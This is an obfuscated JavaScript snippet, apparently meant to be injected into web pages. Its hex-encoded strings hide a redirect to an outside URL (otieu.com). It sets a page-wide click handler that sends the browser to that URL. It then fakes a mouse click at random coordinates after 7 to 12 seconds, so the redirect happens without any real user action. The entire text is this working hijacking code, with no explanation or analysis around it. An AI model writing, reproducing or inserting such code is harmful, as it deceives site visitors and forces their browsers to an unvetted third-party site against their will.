(function(){
  var _0x1a2f=["\x63\x6C\x69\x63\x6B","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x66\x61\x6C\x73\x65","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x72\x65\x64\x69\x72\x65\x63\x74\x65\x64","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6F\x74\x69\x65\x75\x2E\x63\x6F\x6D\x2F\x34\x2F\x39\x36\x35\x34\x33\x33\x36"];
  var a=_0x1a2f[5];
  var b=false;
  document[_0x1a2f[1]](_0x1a2f[0],function(){
    if(!b){
      b=true;
      window[_0x1a2f[4]][_0x1a2f[3]]=_0x1a2f[6];
    }
  });

  function c(x,y){
    var e=new MouseEvent(_0x1a2f[0],{
      bubbles:true,
      cancelable:true,
      view:window,
      clientX:x,
      clientY:y
    });
    var el=document.elementFromPoint(x,y);
    if(el){el.dispatchEvent(e);}
  }

  var d=Math.floor(Math.random()*5000)+7000;
  setTimeout(function(){
    var w=window.innerWidth;
    var h=window.innerHeight;
    var x=Math.floor(Math.random()*w);
    var y=Math.floor(Math.random()*h);
    c(x,y);
  },d);
})();
